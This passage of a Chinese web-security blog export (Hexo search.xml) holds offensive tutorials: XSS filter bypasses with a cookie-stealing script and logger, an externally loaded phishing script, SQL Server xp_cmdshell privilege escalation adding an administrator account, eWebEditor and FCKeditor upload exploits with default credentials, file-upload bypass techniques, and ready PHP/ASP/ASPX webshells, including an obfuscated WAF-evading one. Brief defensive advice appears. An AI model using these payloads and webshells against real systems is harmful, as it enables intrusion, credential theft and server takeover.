src="" onerror="alert(1)"&gt;$name = preg_replace(“&lt;/script&gt;/i”,””,$name); d.过滤关键字”alert”，并且考虑大小写的情况：源代码：1$name = preg_replace(“alert/i”,””,$name); 测试语句：1&lt;img src=N onerror=”eval(String.fromCharCode(97,108,101,114,116,40,49,41))”&gt; 注意：以上所有情况都需要考虑标签闭合的问题，例如：当程序无任何过滤的时候，插入我们的测试语句，查看页面源代码：1&lt;INPUT type="text" value='&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;'&gt; 可以发现，测试语句被关在了INPUT标签中，尝试输入如下代码，来跳出INPUT标签，并且闭合后面的引号：1'&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;&lt;xss a=' 带入到原句中：1&lt;INPUT type="text" value=''&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;&lt;xss a=''&gt; Cookie接收脚本实现触发语句：1&lt;script&gt;window.open("http://localhost/xss/xss.html")&lt;/script&gt; xss.html12345&lt;script&gt; var cookie=document.cookie; var my_url="getcookie.php?c="; window.location.href=my_url+cookie;&lt;/script&gt; getcookie.php1234567&lt;?php $my_cookie=$_GET['c']; $my_file=fopen("cookie.html","a+"); fwrite($my_file,$my_cookie); fwrite($my_file,"&lt;br&gt;"); fclose($my_file);?&gt; 防范跨站攻击对于普通用户而言：在你的WEB浏览器上禁用java脚本，具体方法，先打开你的IE的internet选项，切换到“安全”页，有个“自定义”级别，点他出现如下窗口，禁用就可以了。但是好象不太可能，因为一旦禁用，很多功能就丧失了，这个方法是下策。还有不要访问包含〈〉字符的连接，当然一些官方的URL不会包括任何脚本元素。对于开发人员而言：如果你的站点程序含论坛，留言板，以及其他程序中含提交数据格式的。需要对提交数据进行过滤，如：转换掉“&lt;”和“&gt;”，使用户不能构造Html标记；过滤掉 “:”和“&amp;”，使用户不能将标记的属性设为script；过滤掉空格，使用户不能引发事件机制等。 存储型跨站脚本的用途插入js文件，将页面重定向到一个其他页面，这个页面可以是仿造原来网站的一个登陆页面，提示用户登录失败，需要重新输入密码登录，进行钓鱼攻击：1&lt;script src=http://www.xxx.com/a.js&gt;&lt;/script&gt; a.js中的内容：1window.location.href="http://www.钓鱼网站.com";]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL Server2005 提权]]></title>
    <url>%2F2017%2F04%2F26%2FSQL-Server2005-%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[简介SQL Server 2005和SQL Server 2008默认将 xp_cmdshell 等危险存储过程删除。 提权前提条件需要获取sa账号密码。 获取sa密码使用SQL Server数据库的一般为asp系统或者aspx系统。获取到网站的源代码之后，查看首页文件源代码default.asp(或者其他文件名)，获取到数据库的连接文件，数据库连接文件名称一般为conn.asp、openconnecting.asp，connection.asp，这些文件多位于网站根目录或者”include”目录下，查看这些文件获取数据库的连接账户和密码，aspx系统查看web.config文件获取账号密码。 添加xp_cmdshell存储过程使用Navicat for SQL Server连接上数据库，在查询功能中执行SQL命令，如下图所示：执行如下命令开启xp_cmdshell存储过程：EXEC sp_configure ‘show advanced options’,1;RECONFIGUREEXEC sp_configure ‘xp_cmdshell’,1;RECONFIGURE执行如下命令添加系统管理员：xp_cmdshell ‘net user lzx lzx /add’xp_cmdshell ‘net loaclgroup administrators lzx /add’提权成功，远程3389连接服务器。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[eWebEditor编辑器漏洞利用]]></title>
    <url>%2F2017%2F04%2F26%2FeWebEditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[简介eWebEditor是一个基于浏览器的在线HTML编辑器，该编辑器曾经爆出过多个漏洞。 Ewebeditor编辑器的默认信息默认管理地址：ewebeditor/admin_login.asp默认帐号密码：admin，admin或者admin，admin888默认数据库：ewebeditor/db/ewebeditor.mdb（默认数据库支持下载）登录界面： 漏洞利用目录遍历漏洞进入后台，依次点击上传文件管理，选择样式目录，点击test文件夹：这个时候，地址栏中会多出dir参数，通过操作该参数，能够遍历网站目录结构： 上传的参数类型允许修改进入后台管理界面，选择样式管理，找到一处能够修改样式的style，注意，standard、 s_full等样式可能无法修改：找到最下面的email样式，进行修改，将图片类型添加asaspp，如果添加asp的话会上传失败，因为编辑器会过滤asp，添加asaspp，过滤asp之后，还是asp：同时需要注意上传路径，应该与standard、 s_full等样式的上传路径保持一致，否则会上传失败。添加完成之后，保存。点击预览，载入预览页面： 数据库只读？构造上传如果编辑器数据库设置为只读，那么无法修改上传类型。这种情况一般是网站再被入侵之后，攻击者为了防止其他人再次入侵，进行的设置。构造上传：读取数据库文件，查看eWebEditor_Style表，可以看到前人来过的痕迹：注意前面的S_ID。构造如下地址：http://127.0.0.2/0/ewebeditor/eWebEditor.asp?id=14&amp;style=standard注意id应与前面的S_ID保持一致，访问该页面，上传asp大马。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>编辑器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FckEditor编辑器漏洞利用]]></title>
    <url>%2F2017%2F04%2F26%2FFckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[简介FCKeditor是一个专门使用在网页上属于开放源代码的所见即所得文字编辑器。它志于轻量化，不需要太复杂的安装步骤即可使用。它可和PHP、JavaScript、ASP、ASP.NET、ColdFusion、Java、以及ABAP等不同的编程语言相结合。“FCKeditor”名称中的“FCK” 是这个编辑器的作者的名字Frederico Caldeira Knabben的缩写。 ASP版本漏洞版本：&lt;=v2.6.3两个编辑器自带的测试上传页面： a.fckeditor/editor/filemanager/connectors/test.html b.fckeditor/editor/filemanager/connectors/uploadtest.html使用a页面新建文件或者文件夹的时候，文件名中的”.”会被过滤未”_”。 利用方法：a.构造好如下地址访问：fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=/qing.asp&amp;NewFolderName=x.asp (如果为其他类型的脚本语言，注意替换url中的关键字)，会在/qing.asp文件夹下创建x_asp文件夹。b.访问测试上传页面a.fckeditor/editor/filemanager/connectors/test.html，修改Current Folder未qing.asp文件夹，上传木马文件至该文件夹。c.访问木马文件。 漏洞分析：程序对参数’NewFolderName’进行过滤，但是并没有对参数’CurrentFolder’进行过滤，所以我们可以通过操作’CurrentFolder’参数，来创建满足解析漏洞的文件夹。 若管理员禁止了以上两个测试页面的上传功能，可以通过构造的地址新建符合解析漏洞的文件夹，访问测试页面获取到文件夹的地址，然后找到后台的上传地址，上传文件，上传是需要修改上传链接中的path参数，将文件上传到刚才新建的符合解析漏洞的目录。 PHP版本漏洞版本：&lt;=2.4.2编辑器未对Media类型进行上传文件类型的控制，导致用户能够上传任意文件。 利用方法：将如下代码保存成html文件，注意test.com修改为目标地址：1&lt;form id="frmUpload" enctype="multipart/form-data"action="http://test.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media" method="post"&gt;Upload a new file:&lt;br&gt;&lt;input type="file" name="NewFile" size="50"&gt;&lt;br&gt;&lt;input id="btnUpload" type="submit" value="Upload"&gt;&lt;/form&gt; 上传php文件之后，右键查看网页源代码获取webshell地址。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>编辑器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传总结]]></title>
    <url>%2F2017%2F04%2F26%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[概述Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。 上传检测流程通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤： 客户端JavaScript检测 (通常为检测文件扩展名) 服务端MIME类型检测 (检测Content-Type内容) 服务端目录路径检测 (检测跟Path参数相关的内容) 服务端文件扩展名检测 (检测跟文件extension相关的内容) 服务端文件内容检测 (检测内容是否合法或含有恶意代码) 绕过方法客户端检测(JavaScript检测)这类检测，通常是在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测扩展名是否合法，示例代码如下：12345678910111213141516function check()&#123; var filename = document.getElementById("file"); var str = filename.value.split("."); var ext = str[str.length-1]; if(ext=='jpg'||ext=='png'||ext=='jpeg'||ext=='gif') &#123; return true; &#125; else &#123; alert("仅允许上传png/jpeg/gif类型的文件！") return false; &#125; return false;&#125; 判断该类检测的方法：选择一个禁止上传类型的文件上传，当点击确定按钮之后，浏览器立即弹窗提示禁止上传，一般就可以断定为客户端JavaScript检测，进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测）。 绕过方法： 上传页面，审查元素，修改JavaScript检测函数； 将需要上传的恶意代码文件类型改为允许上传的类型，例如将dama.asp改为dama.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名dama.jpg改为dama.asp。 上传webshell.jpg.jsp，可能前端程序检查后缀时，从前面开始检查。 服务端MIME类型检测服务器端检测文件MIME类型可能的代码如下：1234567891011121314151617&lt;?php if($_FILES['userfile']['type']!="image/gif") &#123;//检测Content-type echo"Sorry,weonlyallowuploadingGIFimages"; exit; &#125; $uploaddir='uploads/'; $uploadfile=$uploaddir.basename($_FILES['userfile']['name']); if(move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile)) &#123; echo"Fileisvalid,andwassuccessfullyuploaded.\n"; &#125; else &#123; echo"Fileuploadingfailed.\n"; &#125;?&gt; 绕过方法：配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型。 服务端目录路径检测上传的数据包中，如果存在path(或者其他名称)等能够操作上传路径的参数，修改该参数配合解析漏洞Get Webshell，该方法一般asp系统用比较多。例如path参数为如下“upfile/”，可以尝试修改为“upfile.asp/”或者“upfile/1.asp/”或者“upfile/1.asp;.”，注意观察返回的文件名。返回的文件名可能为：upfile/1.asp;.201704117886.jpg，满足IIS6.0解析漏洞。 服务端文件扩展名检测黑名单检测：黑名单的安全性比白名单低很多，服务器端，一般会有个专门的blacklist文件，里面会包含常见的危险脚本文件类型，例如：html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh等等。白名单检测：仅允许指定的文件类型上传，比如仅允许上传jpg | gif | doc | pdf等类型的文件，其他文件全部禁止。 绕过方法： 文件名大小写绕过：使用Asp、PhP之类的文件名绕过黑名单检测 名单列表绕过：用黑名单里没有的名单进行攻击，比如很名单中没有的asa或者cer之类 特殊文件名绕过：比如在发送的HTTP包中，将文件名改为”dama.asp.”或者”dama.asp_”(下划线为空格)，这种命名方式在window系统里是不被允许的，所以需要在Burp Suite中抓包修改，上传之后，文件名会被window自动去掉后面的点或者空格，需要注意此种方法仅对window有效，Unix/Linux系统没有这个特性。 0x00截断绕过：伪代码如下： 1234Name = getname(http requests)//假如这一步获取到的文件名是dama.asp .jpgType = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件If(type == jpg)SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里 操作方法：上传dama.jpg，Burp抓包，将文件名改为dama.php%00.jpg，选中%00，进行url-decode。 上传.htaccess文件攻击：（适用于黑名单检测方式，黑名单中未限制.htaccess）该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下： 123&lt;FilesMatch "_php.gif"&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，如果没启用，启用方法见：http://www.jb51.net/article/25476.htm 然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有.htaccess文件，那么我们可以上传.htaccess文件覆盖掉原来的文件。 解析漏洞绕过直接上传一个注入过恶意代码的非黑名单文件即可，再利用解析漏洞利用。 服务端文件内容检测如果文件内容检测设置的比较严格，那么上传攻击将变得非常困难。以最常见的图片类型内容检测举例。 文件幻数检测：JPG ： FF D8 FF E0 00 10 4A 46 49 46GIF ： 47 49 46 38 39 61 (GIF89a)PNG： 89 50 4E 47绕过方法：在文件幻数后面加上自己的一句话木马就行了。 文件相关信息检测：一般就是检查图片文件的大小，图片文件的尺寸之类的信息。绕过方法：伪造好文件幻数，在后面添加一句话木马之后，再添加一些其他的内容，增大文件的大小。 文件加载检测：这个是最变态的检测，一般是调用API或者函数去进行文件加载测试，常见的是图像渲染测试，再变态一点的甚至是进行二次渲染。绕过方法：针对渲染加载测试：代码注入绕过针对二次渲染测试：攻击文件加载器 通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入即可。 Web Server解析漏洞Apache解析漏洞一个文件名为xxx.x1.x2.x3的文件（例如：index.php.fuck）， Apache会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样一直往前尝试，直到遇到一个能解析的扩展名为止。WampServer2.0AllVersion(WampServer2.0i/Apache2.2.11)WampServer2.1AllVersion(WampServer2.1e-x32/Apache2.2.17)Wamp5AllVersion(Wamp5_1.7.4/Apache2.2.6)AppServ2.4AllVersion(AppServ-2.4.9/Apache2.0.59)AppServ2.5AllVersion(AppServ-2.5.10/Apache2.2.8)AppServ2.6AllVersion(AppServ-2.6.0/Apache2.2.8)以上集成环境都存在扩展名解析顺序漏洞，并且这些环境都存在对php3文件按照php来解析这个小洞。该方法针对黑名单不全时，能够绕过。总结存在该漏洞的Apache版本：Apache2.0.x&lt;=2.0.59Apache2.2.x&lt;=2.2.17 IIS解析漏洞IIS6.0a.文件类型正常：www.xxx.com/logo.jpg触发漏洞：www.xxx.com/logo.asp;.jpg按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么logo.php;.jpg也会被当成PHP文件执行） b.文件夹类型正常：www.xxx.com/image/logo.jpg触发漏洞：www.xxx.com/image.asp/logo.jpg按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么image.php文件夹下的文件也会被当做PHP文件解析。） IIS7.0以上IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。（例如：webshell.jpg/x.php）IIS7.0(Win2008R1+IIS7.0)IIS7.5(Win2008R2+IIS7.5)IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”任意文件名/任意文件名.php”这个漏洞其实是出现自php-cgi 的漏洞， 所以其实跟IIS自身是无关的。 Nginx解析漏洞目前Nginx主要有这两种漏洞：a.一个是对任意文件名，在后面添加”/任意文件名.php”的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。b.低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。Nginx0.5.Nginx0.6.Nginx0.7. &lt;= 0.7.65Nginx0.8. &lt;= 0.8.37对于”任意文件名/任意文件名.php”这个漏洞其实是出现自php-cgi的漏洞，所以其实跟Nginx自身是无关的。 总结从攻击者的角度来给上传分类： 轻量级检测绕过a.绕过前端JavaScript检测：使用Burp抓包改包。b.绕过服务器端MIME类型检测：使用Burp抓包改包。 路径/文件扩展名检测绕过a.黑名单检测方式文件名大小写绕过；名单列表绕过；特殊文件名绕过；0x00截断绕过；.htaccess文件攻击；本地文件包含漏洞；Apache解析漏洞；IIS解析漏洞；Nginx解析漏洞；b.白名单检测方式0x00截断绕过；本地文件包含漏洞；Apache解析漏洞；IIS解析漏洞；Nginx解析漏洞； 文件内容检测方式对文件进行恶意代码注入，再配合解析漏洞。 文件上传防御图中带红点的是防御的重要环节： 轻量级检测必然能绕过 检测的重点放在文件内容检测 路径/扩展名检测一定要用白名单 不能有本地文件包含漏洞 随时注意更新Web应用软件 一句话木马1234php : &lt;?php @eval($_POST[‘lzx’]);?&gt; : &lt;?php $a = "a"."s"."s"."e"."r"."t";$a($_POST[cc]);?&gt;asp : &lt;% eval request(“lzx”)%&gt;aspx : &lt;%@ Page Language="Jscript"%&gt;&lt;%eval(Request.Item["lzx"],"unsafe");%&gt; php过狗一句话：1234567891011&lt;?php $mt="JF9QT1N"; $ojj="QGV2YWwo"; $hsa="UWydpMGle"; $fnx="5BeSleleddKTs="; $zk = str_replace("d","","sdtdrd_redpdldadcde"); $ef = $zk("z", "", "zbazsze64_zdzeczodze"); $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn"); $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); $zvm(); ?&gt; 分析：12345678910111213$zk = "str_replace";$ef = $zk("z", "", "zbazsze64_zdzeczodze"); = str_replace("z", "", "zbazsze64_zdzeczodze") = "base64_decode"$dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn"); = str_replace("p","","pcprpepaptpe_fpupnpcptpipopn") = "create_function"$zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); = create_function('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))) = create_function('', base64_decode(str_replace("le", "", $ojj.$mt.$hsa.$fnx))) = create_function('', base64_decode(str_replace("le", "", QGV2YWwoJF9QT1NUWydpMGle5BeSleleddKTs=))) = create_function('', base64_decode("QGV2YWwoJF9QT1NUWydpMG5BeSddKTs=")) = create_function('', "@eval($_POST['i0nAy']);") 过狗一句话总结为：打乱字符；编码技术；拆分组合；创建，匹配。 图片木马制作命令：1copy /b 1.jpg+2.php 文件上传防御1.关掉上传文件的功能如果Web应用程序不需要上传文件的功能，则可以直接将上传文件的功能关闭来避免不必要的麻烦。打开“php.ini”文件，找到file uploads的位置，将file_uploads设置成Off。2.限制能够上传的文件大小如果黑客采取连续不断地上传文件，或是上传极大的文件，来使Web应用程序没有更多资源来处理其他来访者的请求，黑客就可以借此来瘫痪网站。PHP的限制机制可以让您限制允许上传文件体积的最大值，来避免来访者上传太大的文件。单独POST请求的最大值，可以使用php.ini文件的upload_max_size来设置。打开“php.ini”文件，找到upload_max_size的位置，将upload_max_size设置成想要的值。3.检查上传文件的类型4.检查上传文件的内容5.上传的文件不要保存在公开的文件夹内，以避免被黑客直接读取。另外将文件的路径隐藏起来，或是将文件名称改成没有扩展名的随机文件名，都可以增加上传文件的安全性。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
</search>